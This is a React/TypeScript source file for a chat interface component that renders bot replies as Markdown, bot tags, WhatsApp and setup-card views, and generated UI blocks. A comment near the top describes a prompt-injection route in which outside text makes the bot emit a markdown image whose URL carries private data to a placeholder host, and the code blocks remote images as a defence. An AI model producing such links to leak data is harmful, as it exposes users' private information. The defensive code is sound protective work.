import { createElement, memo, useContext, useMemo, type ReactNode } from "react";
import { defaultRehypePlugins, Streamdown } from "streamdown";

import { splitReply, UI_FENCE } from "@zetta/render/reply";
import { cn } from "@zetta/ui/lib/utils";
import { BotsContext } from "@/components/bot-identity";
import { BotTag } from "@/components/bot-tag";

import { rehypeBotTags } from "./bot-tags";
import { SetupCard } from "./setup-card";
import { parseSetupCard } from "./setup-card-data";
import { stripToolFences } from "./tool-fences";
import { UiSkeleton, UiView } from "./ui-registry";
import { parseWhatsapp, WhatsappView } from "./whatsapp-view";

const BODY = "chat-response min-w-0 [&>*:first-child]:mt-0 [&>*:last-child]:mb-0";

/**
 * A reply can carry text from outside (a web page, an email) that makes the bot write `![x](https://host/?d=private)`; drawing the
 * image would send that request as soon as the reply renders. Show the alt text instead.
 */
const NO_REMOTE_IMAGES = {
  img: ({ alt }: { alt?: string | undefined }) =>
    alt ? <span className="text-muted-foreground">[{alt}]</span> : null,
};

const Markdown = memo(function Markdown({
  text,
  streaming,
  className,
}: {
  text: string;
  streaming: boolean;
  className?: string | undefined;
}) {
  const bots = useContext(BotsContext);
  // Bot names in the text become `BotTag`s. Our plugin runs after the default ones (sanitize included), so its `bot-tag` elements are not stripped.
  const { rehypePlugins, components } = useMemo(() => {
    const list = [...bots.values()];
    if (!list.length) return { rehypePlugins: undefined, components: NO_REMOTE_IMAGES };
    return {
      rehypePlugins: [...Object.values(defaultRehypePlugins), rehypeBotTags(list)],
      components: {
        ...NO_REMOTE_IMAGES,
        "bot-tag": ({ children, ...props }: { children?: ReactNode }) => {
          const bot = bots.get(String((props as Record<string, unknown>)["data-bot-id"]));
          return bot ? (
            <BotTag bot={bot}>{children}</BotTag>
          ) : (
            createElement("span", null, children)
          );
        },
      },
    };
  }, [bots]);
  return (
    <Streamdown
      mode={streaming ? "streaming" : "static"}
      rehypePlugins={rehypePlugins}
      isAnimating={streaming}
      parseIncompleteMarkdown={streaming}
      className={cn(BODY, className)}
      components={components}
    >
      {text}
    </Streamdown>
  );
});

/**
 * Message body. Markdown goes through Streamdown, which tolerates half-written syntax while a reply streams; fenced `zetta:ui`
 * blocks are drawn by json-render from the shared catalog (a block that never validates is shown as the code it is).
 */
const CARD = /```zetta:(whatsapp|setup-card)\s*\n([\s\S]*?)```/g;

export const Response = memo(function Response({
  text: raw,
  streaming = false,
  className,
}: {
  text: string;
  streaming?: boolean;
  className?: string;
}) {
  const text = streaming ? stripToolFences(raw) : raw;
  const whatsapp = !streaming && /```zetta:(whatsapp|setup-card)/.test(text);
  // Hooks stay above the early return (a reply can flip to the WhatsApp view when it settles). A reply with no ui fence skips the parse on every chunk.
  const segments = useMemo(
    () => (whatsapp || !text.includes("```" + UI_FENCE) ? [] : splitReply(text, streaming)),
    [text, streaming, whatsapp],
  );
  if (whatsapp) {
    const parts: {
      md?: string;
      wa?: ReturnType<typeof parseWhatsapp>;
      setup?: ReturnType<typeof parseSetupCard>;
      raw?: string;
    }[] = [];
    let last = 0;
    for (const m of text.matchAll(CARD)) {
      if (m.index! > last) parts.push({ md: text.slice(last, m.index) });
      parts.push(
        m[1] === "setup-card"
          ? { setup: parseSetupCard(m[2]!), raw: m[2]! }
          : { wa: parseWhatsapp(m[2]!), raw: m[2]! },
      );
      last = m.index! + m[0].length;
    }
    if (last < text.length) parts.push({ md: text.slice(last) });
    return (
      <div className={cn("flex min-w-0 flex-col gap-2", className)}>
        {parts.map((p, i) =>
          p.md !== undefined ? (
            p.md.trim() ? (
              <Response key={i} text={p.md} />
            ) : null
          ) : p.setup ? (
            <SetupCard key={i} data={p.setup} />
          ) : p.wa ? (
            <WhatsappView key={i} data={p.wa} />
          ) : (
            <Markdown key={i} text={`\`\`\`json\n${p.raw}\n\`\`\``} streaming={false} />
          ),
        )}
      </div>
    );
  }
  if (segments.every((s) => s.kind === "markdown"))
    return <Markdown text={text} streaming={streaming} className={className} />;
  return (
    <div className={cn("flex min-w-0 flex-col gap-2", className)}>
      {segments.map((s, i) =>
        s.kind === "markdown" ? (
          <Markdown key={i} text={s.text} streaming={streaming && i === segments.length - 1} />
        ) : s.spec ? (
          <UiView key={i} spec={s.spec} streaming={!s.complete} />
        ) : s.complete ? (
          <Markdown key={i} text={`\`\`\`json\n${s.raw}\n\`\`\``} streaming={false} />
        ) : (
          <UiSkeleton key={i} />
        ),
      )}
    </div>
  );
});
